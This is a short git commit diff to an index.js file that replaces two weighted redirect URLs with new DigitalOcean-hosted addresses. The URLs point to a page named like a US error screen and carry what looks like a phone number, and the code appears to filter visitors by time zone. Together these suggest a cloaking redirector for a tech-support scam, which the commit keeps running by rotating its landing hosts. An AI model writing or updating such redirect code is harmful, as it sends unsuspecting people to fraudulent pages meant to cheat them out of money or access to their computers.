6f5387ded64a756765630e6cdf5c769f5b45e509
paalakash <palaksh452@gmail.com>
2026-06-04 07:53:41 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,8 +31,8 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://clownfish-app-h7gz6.ondigitalocean.app/werrx01USAHTML/?bcda=1800-209-169", weight: 0.5 },
-    { url: "https://clownfish-app-h7gz6.ondigitalocean.app/werrx01USAHTML/?bcda=1800-209-169", weight: 0.5 }
+    { url: "https://octopus-app-2-iy3c9.ondigitalocean.app/werrx01USAHTML/?bcda=1800-209-169", weight: 0.5 },
+    { url: "https://octopus-app-2-iy3c9.ondigitalocean.app/werrx01USAHTML/?bcda=1800-209-169", weight: 0.5 }
 
 ];
 
